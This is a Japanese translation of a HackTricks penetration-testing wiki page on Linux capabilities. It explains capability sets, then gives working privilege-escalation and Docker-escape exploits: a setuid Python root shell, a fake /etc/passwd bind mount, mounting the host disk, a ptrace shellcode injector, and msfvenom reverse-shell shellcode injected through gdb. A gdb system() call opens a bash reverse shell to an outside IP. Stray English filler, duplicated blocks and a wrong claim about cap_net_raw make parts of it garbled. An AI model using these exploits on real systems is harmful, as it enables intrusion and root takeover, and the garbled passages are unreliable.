# Linux Capabilities

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* サイバーセキュリティ会社で働いていますか？ HackTricksであなたの会社を宣伝したいですか？または、最新バージョンのPEASSにアクセスしたいですか、またはHackTricksをPDFでダウンロードしたいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください、私たちの独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクション
* [**公式のPEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローしてください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* ハッキングのトリックを共有するには、[**hacktricks repo**](https://github.com/carlospolop/hacktricks)と[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出してください。

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/)は、**スペイン**で最も関連性の高いサイバーセキュリティイベントであり、**ヨーロッパ**でも最も重要なイベントの一つです。技術的な知識を促進することを目的として、この会議はあらゆる分野の技術とサイバーセキュリティの専門家のための活気ある交流の場です。

{% embed url="https://www.rootedcon.com/" %}

## なぜcapabilitiesを使用するのか？

Linuxのcapabilitiesは、プロセスに利用可能なroot権限の一部を提供します。これにより、root権限がより小さく独立した単位に分割されます。それぞれの単位は個別にプロセスに付与することができます。これにより、特権のセットが減少し、攻撃リスクが低下します。

Linuxのcapabilitiesがどのように機能するかをよりよく理解するために、まずは解決しようとしている問題を見てみましょう。

通常のユーザーとしてプロセスを実行していると仮定しましょう。これは特権を持たないことを意味します。所有者、グループ、またはすべてのユーザーによってアクセスが許可されているデータにのみアクセスできます。ある時点で、プロセスはネットワークソケットを開くなど、少し多くの権限が必要になる場合があります。問題は、通常のユーザーはソケットを開くことができないということです。なぜなら、これにはroot権限が必要だからです。

## Capabilitiesセット

**継承されたcapabilities**

**CapEff**: _有効な_ capabilityセットは、プロセスが現在使用しているすべてのcapabilitiesを表します（これは、カーネルが許可チェックに使用するcapabilitiesの実際のセットです）。ファイルcapabilitiesの場合、有効なセットは、バイナリの実行時に許可されたセットのcapabilitiesが有効なセットに移動するかどうかを示す単一のビットです。これにより、capabilitiesを認識していないバイナリでも、特別なシステムコールを発行せずにファイルcapabilitiesを使用することができます。

**CapPrm**: (_許可された_) これは、スレッドがスレッドの許可されたセットまたはスレッドの継承可能なセットに追加できるcapabilitiesのスーパーセットです。スレッドはcapset()システムコールを使用してcapabilitiesを管理できます。スレッドは任意のセットから任意のcapabilityを削除できますが、スレッドの許可されたセットに存在するcapabilitiesのみをスレッドの有効なセットと継承可能なセットに追加できます。したがって、スレッドの有効なセットにcap\_setpcap capabilityがある場合を除き、スレッドの許可されたセットには任意のcapabilityを追加できません。

**CapInh**: _継承_ セットを使用すると、親プロセスから継承できるcapabilitiesを指定できます。これにより、プロセスが必要のないcapabilitiesを受け取ることを防ぐことができます。このセットは`execve`を介して保持され、通常は子プロセスにcapabilitiesを提供するプロセスによって設定されます。

**CapBnd**: _バウンディング_ セットを使用すると、プロセスが受け取ることができるcapabilitiesを制限することができます。バウンディングセットに存在するcapabilitiesのみが、継承可能なセットと許可されたセットで許可されます。

**CapAmb**: _アンビエント_ capabilityセットは、ファイルcapabilitiesを持たないすべての非SUIDバイナリに適用されます。これは、`execve`を呼び出す際にcapabilitiesを保持します。ただし、アンビエントセットのすべてのcapabilitiesが保持されるわけではありません。なぜなら、継承可能なセットまたは許可されたcapabilityセットに存在しない場合、capabilitiesが削除されるためです。このセットは`execve`呼び出しを介して保持されます。

スレッドとファイルのcapabilitiesの違いと、capabilitiesがスレッドにどのように渡されるかの詳細な説明については、次のページを参照してください：

* [https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
* [https://blog.ploetzli.ch/2014/understanding-linux-capabilities/](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)

## プロセスとバイナリのCapabilities

### プロセスのCapabilities

特定のプロセスのcapabilitiesを確認するには、/procディレクトリの**status**ファイルを使用します。詳細情報を提供するため、Linuxのcapabilitiesに関連する情報に限定します。\
実行中のすべてのプロセスについて、capabilities情報はスレッドごとに保持されます。ファイルシステムのバイナリについては、拡張属性に格納されます。

capabilitiesの定義は/usr/include/linux/capability.hにあります。

現在のプロセスのcapabilitiesは`cat /proc/self/status`または`capsh --print`で、他のユーザーのcapabilitiesは`/proc/<pid>/status`で確認できます。
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
このコマンドは、ほとんどのシステムで5行を返すはずです。

* CapInh = 継承された機能
* CapPrm = 許可された機能
* CapEff = 有効な機能
* CapBnd = バウンディングセット
* CapAmb = アンビエント機能セット
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
これらの16進数は意味をなしません。capshユーティリティを使用して、それらを機能名にデコードすることができます。
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
さあ、今度は`ping`が使用する**capabilities**を確認しましょう。
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
それは機能しますが、別のより簡単な方法もあります。実行中のプロセスの機能を確認するには、単に**getpcaps**ツールを使用し、その後にプロセスID（PID）を指定します。複数のプロセスIDのリストも指定できます。
```bash
getpcaps 1234
```
以下は、`tcpdump`の機能を確認します。バイナリに十分な機能（`cap_net_admin`と`cap_net_raw`）を与えて、ネットワークをスニッフすることができます（_tcpdumpはプロセス9562で実行されています_）:
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
与えられた機能は、バイナリの機能を取得する2つの方法の結果に対応しています。\
_getpcaps_ツールは、特定のスレッドの利用可能な機能をクエリするために**capget()**システムコールを使用します。このシステムコールでは、PIDを提供するだけでより多くの情報を取得できます。

### バイナリの機能

バイナリは、実行中に使用できる機能を持つことがあります。たとえば、`ping`バイナリには`cap_net_raw`機能が非常に一般的に存在します。
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
次のコマンドを使用して、**機能を持つバイナリを検索**できます。

```bash
getcap -r / 2>/dev/null
```
```bash
getcap -r / 2>/dev/null
```
### capshを使用して権限を削除する

CAP\_NET\_RAWの権限を_ping_から削除すると、pingユーティリティはもはや機能しなくなります。
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
_capsh_自体の出力に加えて、_tcpdump_コマンド自体もエラーを発生させるべきです。

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

このエラーは、pingコマンドがICMPソケットを開くことが許可されていないことを明確に示しています。これで、期待どおりに動作することが確認できました。

### キャパビリティの削除

バイナリのキャパビリティを削除することができます。
```bash
setcap -r </path/to/binary>
```
## ユーザーの権限

おそらく、**ユーザーにも権限を割り当てることができる**ようです。これはおそらく、ユーザーが実行するすべてのプロセスがユーザーの権限を使用できることを意味します。\
[こちら](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7)、[こちら](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)、および[こちら](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user)を参考に、特定の権限をユーザーに割り当てるためにいくつかのファイルを設定する必要がありますが、各ユーザーに権限を割り当てるためのファイルは `/etc/security/capability.conf` です。\
ファイルの例：
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## 環境の機能

以下のプログラムをコンパイルすると、**機能を提供する環境内でbashシェルを起動することができます**。

{% code title="ambient.c" %}
```c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```
{% endcode %}
```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
**コンパイルされた環境バイナリによって実行されるbash**内で、**新しい機能**を観察することができます（通常のユーザーは「現在の」セクションには何の機能も持っていません）。
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
{% hint style="danger" %}
許可されたセットと継承可能なセットの両方に存在する機能のみを追加できます。
{% endhint %}

### 機能対応/機能非対応のバイナリ

**機能対応のバイナリは、環境で与えられた新しい機能を使用しません**が、**機能非対応のバイナリは**それらを拒否しないため、使用します。これにより、機能非対応のバイナリは、機能をバイナリに付与する特別な環境内で脆弱になります。

## サービスの機能

デフォルトでは、**rootとして実行されるサービスにはすべての機能が割り当てられます**が、場合によってはこれは危険です。\
したがって、**サービスの設定**ファイルでは、サービスが不必要な特権で実行されるのを避けるために、持っているべき**機能**と**実行するユーザー**を**指定**することができます。
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Dockerコンテナの機能

デフォルトでは、Dockerはコンテナにいくつかの機能を割り当てます。これらの機能を確認するには、次のコマンドを実行するだけです。
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/)は、**スペイン**で最も関連性の高いサイバーセキュリティイベントであり、**ヨーロッパ**でも最も重要なイベントの一つです。技術的な知識を促進することを使命としているこの会議は、あらゆる分野の技術とサイバーセキュリティの専門家のための活気ある交流の場です。

{% embed url="https://www.rootedcon.com/" %}

## Privesc/Container Escape

特権操作を実行した後に、自分自身のプロセスを制限したい場合には、機能は便利です（例：chrootの設定やソケットへのバインドの後）。ただし、これらは悪意のあるコマンドや引数を渡すことで悪用される可能性があり、その場合はrootとして実行されます。

`setcap`を使用してプログラムに機能を強制し、`getcap`を使用してこれらをクエリできます。
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
`+ep`は、能力を追加することを意味します（「-」は削除することを意味します）が、Effective（有効）とPermitted（許可）として追加されます。

システムまたはフォルダ内のプログラムを特定するには、次の手順を実行します：
```bash
getcap -r / 2>/dev/null
```
### 攻撃例

以下の例では、バイナリ `/usr/bin/python2.6` が特権昇格の脆弱性があることがわかりました。
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**パケットのスニッフィングを任意のユーザーに許可するために必要な** `tcpdump` **の** **Capabilities**：

```markdown
To allow any user to sniff packets using `tcpdump`, the following capabilities need to be granted:

1. `CAP_NET_RAW`: This capability allows the user to create raw sockets, which is necessary for packet sniffing.

To grant these capabilities to `tcpdump`, you can use the `setcap` command as follows:

```bash
sudo setcap cap_net_raw=eip /usr/sbin/tcpdump
```

After granting these capabilities, any user will be able to use `tcpdump` to sniff packets without requiring root privileges.
```
```html
<p>任意のユーザーが`tcpdump`を使用してパケットをスニッフするためには、次の機能が付与される必要があります：</p>

<ol>
<li><code>CAP_NET_RAW</code>：この機能により、ユーザーはパケットスニッフィングに必要な生のソケットを作成できます。</li>
</ol>

<p>これらの機能を`tcpdump`に付与するには、次のように`setcap`コマンドを使用できます：</p>

<pre><code>sudo setcap cap_net_raw=eip /usr/sbin/tcpdump
</code></pre>

<p>これらの機能を付与した後、任意のユーザーはルート権限を必要とせずに`tcpdump`を使用してパケットをスニッフできます。</p>
```
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### "空"の権限の特殊なケース

注意してください。プログラムファイルに空の権限セットを割り当てることができるため、実行するプロセスの有効なユーザーIDと保存されたユーザーIDを0に変更するが、そのプロセスに権限を与えないset-user-ID-rootプログラムを作成することが可能です。要するに、次の条件を満たすバイナリがある場合：

1. rootの所有ではない
2. `SUID`/`SGID`ビットが設定されていない
3. 空の権限セットが設定されている（例：`getcap myelf`が`myelf =ep`を返す）

そのバイナリは**rootとして実行**されます。

## CAP\_SYS\_ADMIN

[**CAP\_SYS\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html)は主にキャッチオールの機能であり、追加の権限または完全なroot（通常はすべての権限へのアクセス）に簡単につながることがあります。`CAP_SYS_ADMIN`は、さまざまな**管理操作**を実行するために必要であり、特権操作がコンテナ内で実行される場合、コンテナから削除することは困難です。この機能を保持することは、個々のアプリケーションコンテナよりもシステム全体を模倣するコンテナにとってしばしば必要です。その他のことに加えて、これにより**デバイスのマウント**や**release_agent**の悪用によるコンテナからの脱出が可能になります。

**バイナリの例**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
Pythonを使用して、実際の_passwd_ファイルの上に修正された_passwd_ファイルをマウントすることができます。
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
そして、修正した`passwd`ファイルを`/etc/passwd`に**マウント**します：
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
そして、パスワード「password」を使用して**`su`でrootとしてログイン**することができます。

**環境の例（Dockerの脱出）**

次のコマンドを使用して、Dockerコンテナ内で有効な機能を確認できます。
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
前の出力の中で、SYS\_ADMINの機能が有効になっていることがわかります。

* **マウント**

これにより、Dockerコンテナはホストディスクをマウントし、自由にアクセスすることができます。
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
* **完全なアクセス**

前の方法では、Dockerホストのディスクにアクセスできました。\
ホストが**ssh**サーバーを実行している場合、Dockerホストのディスク内にユーザーを作成し、SSH経由でアクセスすることができます。
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP\_SYS\_PTRACE

**これは、ホスト内で実行されているプロセス内にシェルコードを注入することで、コンテナから脱出することができることを意味します。** ホスト内で実行されているプロセスにアクセスするためには、コンテナを少なくとも **`--pid=host`** オプションで実行する必要があります。

[**CAP\_SYS\_PTRACE**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は、`ptrace(2)` および最近導入されたクロスメモリアタッチシステムコール（`process_vm_readv(2)` および `process_vm_writev(2)`）を使用することを許可します。この機能が許可され、`ptrace(2)` システムコール自体が seccomp フィルタによってブロックされていない場合、攻撃者は他の seccomp 制限をバイパスすることができます。[ptrace が許可されている場合の seccomp バイパスの PoC](https://gist.github.com/thejh/8346f47e359adecd1d53) や、**以下の PoC** を参照してください。

**バイナリ（Python）の例**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**バイナリの例（gdb）**

`ptrace` 機能を持つ `gdb`：
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
## Linux Capabilities

Linux capabilities are a way to divide the privileges traditionally associated with superuser into smaller, distinct units. This allows for more fine-grained control over the privileges granted to a process.

### List Capabilities

To list the capabilities of a specific binary, you can use the `getcap` command:

```bash
$ getcap /path/to/binary
```

### Set Capabilities

To set capabilities on a binary, you can use the `setcap` command:

```bash
$ setcap cap_net_raw+ep /path/to/binary
```

### Remove Capabilities

To remove capabilities from a binary, you can use the `setcap` command with the `-r` option:

```bash
$ setcap -r /path/to/binary
```

### Exploiting Capabilities

Exploiting capabilities can be useful for privilege escalation. If a binary with elevated capabilities is executed by a user with lower privileges, it may be possible to abuse those capabilities to gain additional privileges.

For example, if a binary has the `cap_net_raw` capability, it can bypass certain network restrictions and perform actions that would normally require root privileges.

To exploit capabilities, you can search for binaries with elevated capabilities using tools like `find` or `locate`. Once you find a suitable binary, you can execute it to gain the associated privileges.

### References

- [Linux Capabilities - man7.org](https://man7.org/linux/man-pages/man7/capabilities.7.html)
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (8 - len(buf) % 8 ) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
ルートプロセスをgdbでデバッグし、以前に生成されたgdbの行をコピーして貼り付けます。
```bash
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) set {long}($rip+0) = 0x296a909090909090
(gdb) set {long}($rip+8) = 0x5e016a5f026a9958
(gdb) set {long}($rip+16) = 0x0002b9489748050f
(gdb) set {long}($rip+24) = 0x48510b0e0a0a2923
(gdb) set {long}($rip+32) = 0x582a6a5a106ae689
(gdb) set {long}($rip+40) = 0xceff485e036a050f
(gdb) set {long}($rip+48) = 0x6af675050f58216a
(gdb) set {long}($rip+56) = 0x69622fbb4899583b
(gdb) set {long}($rip+64) = 0x8948530068732f6e
(gdb) set {long}($rip+72) = 0x050fe689485752e7
(gdb) c
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**環境を使用した例（Dockerの脱出）- 別のGDBの悪用**

もし**GDB**がインストールされている場合（または`apk add gdb`または`apt install gdb`などでインストールできる場合）、ホストからプロセスをデバッグし、`system`関数を呼び出すことができます（この技術には`SYS_ADMIN`の権限も必要です）。
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
コマンドの出力は見ることができませんが、そのプロセスによって実行されます（したがって、逆シェルを取得します）。

{% hint style="warning" %}
「現在のコンテキストにシンボル「system」がありません」というエラーが表示される場合は、gdbを使用してプログラムにシェルコードをロードする前の例を確認してください。
{% endhint %}

**環境を使用した例（Dockerの脱出）- シェルコードのインジェクション**

Dockerコンテナ内で有効な機能を確認するには、次のコマンドを使用します：
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
